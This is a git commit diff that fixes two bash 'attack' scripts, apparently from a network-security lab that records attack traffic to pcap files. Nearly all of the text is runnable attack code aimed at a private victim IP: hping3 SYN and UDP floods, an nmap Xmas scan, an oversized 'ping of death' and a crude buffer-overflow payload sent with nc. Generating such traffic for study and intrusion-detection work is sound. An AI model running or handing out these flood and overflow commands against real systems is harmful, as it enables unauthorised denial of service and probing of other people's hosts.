5eefd502731ff371c7c5f0e45be1c147204e8288
towelie03 <dbalsara2003@gmail.com>
2024-11-19 10:32:52 -0800

    fixed the attack script

--- source/part_1_attack.sh
+++ source/part_1_attack.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-victim_ip="192.168.50.19"]
+victim_ip="192.168.50.19"
 interface="eth0"
 
 # Check if the script is running as root
@@ -12,35 +12,35 @@ fi
 
 # TCP SYN flood attack
 echo "Starting TCP SYN flood attack on $victim_ip:"
-tcpdump -i eth0 -w "part1_syn_flood_$timestamp.pcap" &
+tcpdump -i eth0 -w "part1_syn_flood.pcap" &
 hping3 -S -p 80 --flood $victim_ip
 sleep 2
 kill $!
 
 # UDP flood attack
 echo "Starting UDP flood attack on $victim_ip:"
-tcpdump -i eth0 -w "part1_udp_flood_$timestamp.pcap" &
+tcpdump -i eth0 -w "part1_udp_flood.pcap" &
 hping3 --udp -p 53 --flood $victim_ip
 sleep 2
 kill $!
 
 # Xmas Nmap scan
 echo "Starting Xmas Nmap scan on $victim_ip:"
-tcpdump -i eth0 -w "part1_xmas_scan_$timestamp.pcap" &
+tcpdump -i eth0 -w "part1_xmas_scan.pcap" &
 nmap -sX $victim_ip
 sleep 2
 kill $!
 
 # Ping of death
 echo "Starting ping of death attack on $victim_ip:"
-tcpdump -i eth0 -w "part1_ping_of_death_$timestamp.pcap" &
+tcpdump -i eth0 -w "part1_ping_of_death.pcap" &
 ping -s 65500 $victim_ip
 sleep 2
 kill $!
 
 # Buffer overflow attack
 echo "Starting buffer overflow attack on $victim_ip:"
-tcpdump -i eth0 -w "part1_buffer_overflow_$timestamp.pcap" &
+tcpdump -i eth0 -w "part1_buffer_overflow.pcap" &
 python3 -c 'print("A" * 1000)' | nc $victim_ip 1234
 sleep 2
 kill $!
--- source/part_2_attack.sh
+++ source/part_2_attack.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 
-victim_ip="192.168.50.98"
+victim_ip="192.168.50.19"
+interface="eth0"
 
 # Check if the script is running as root
 if [ "$EUID" -ne 0 ]; then
@@ -11,35 +12,36 @@ fi
 
 # TCP SYN flood attack
 echo "Starting TCP SYN flood attack on $victim_ip:"
-tcpdump -i any -w "part2_syn_flood_$timestamp.pcap" &
+tcpdump -i eth0 -w "part2_syn_flood.pcap" &
 hping3 -S -p 80 --flood $victim_ip
 sleep 2
 kill $!
 
 # UDP flood attack
 echo "Starting UDP flood attack on $victim_ip:"
-tcpdump -i any -w "part2_udp_flood_$timestamp.pcap" &
+tcpdump -i eth0 -w "part2_udp_flood.pcap" &
 hping3 --udp -p 53 --flood $victim_ip
 sleep 2
 kill $!
 
 # Xmas Nmap scan
 echo "Starting Xmas Nmap scan on $victim_ip:"
-tcpdump -i any -w "part2_xmas_scan_$timestamp.pcap" &
+tcpdump -i eth0 -w "part2_xmas_scan.pcap" &
 nmap -sX $victim_ip
 sleep 2
 kill $!
 
 # Ping of death
 echo "Starting ping of death attack on $victim_ip:"
-tcpdump -i any -w "part2_ping_of_death_$timestamp.pcap" &
+tcpdump -i eth0 -w "part2_ping_of_death.pcap" &
 ping -s 65500 $victim_ip
 sleep 2
 kill $!
 
 # Buffer overflow attack
 echo "Starting buffer overflow attack on $victim_ip:"
-tcpdump -i any -w "part2_buffer_overflow_$timestamp.pcap" &
+tcpdump -i eth0 -w "part2_buffer_overflow.pcap" &
 python3 -c 'print("A" * 1000)' | nc $victim_ip 1234
 sleep 2
 kill $!
+
